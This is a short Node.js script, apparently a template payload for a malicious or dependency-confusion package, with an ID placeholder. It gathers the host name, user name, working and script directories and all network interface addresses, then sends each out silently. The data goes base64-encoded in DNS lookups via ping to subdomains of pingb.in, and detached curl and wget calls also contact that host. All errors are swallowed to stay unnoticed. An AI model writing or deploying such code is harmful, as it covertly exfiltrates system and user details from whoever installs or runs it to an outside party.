const os = require("os");
const { spawn } = require("child_process");
var isWin = process.platform === "win32";

const id = "%PINGB_ID%";

try {
  exfil({ d_hostname: os.hostname() });
} catch (e) {}
try {
  exfil({ d_user: os.userInfo().username });
} catch (e) {}
try {
  exfil({ d_cwd: `cwd: ${process.cwd()}` });
} catch (e) {}
try {
  exfil({ d_dirname: `dirname: ${__dirname}` });
} catch (e) {}
try {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      exfil({ ["d_net_" + name]: net.address });
    }
  }
} catch (e) {}

try {
  spawn(`curl`, `http://pingb.in/p/${id}`, { detached: true });
  spawn(`wget`, `http://pingb.in/p/${id}`, { detached: true });
} catch (error) {
  
}

//process.exit();

function exfil(data) {
  try {
    const b64 = Buffer.from(JSON.stringify(data))
      .toString("base64")
      .replace(/=/gm, "");

    let args;
    if (isWin) {
      args = ["-n", "1"];
    } else {
      args = ["-c", "1"];
    }
    args.push(`${id}.${b64}.ns.pingb.in`);
    spawn(`ping`, args, { detached: true });
  } catch (e) {}
}
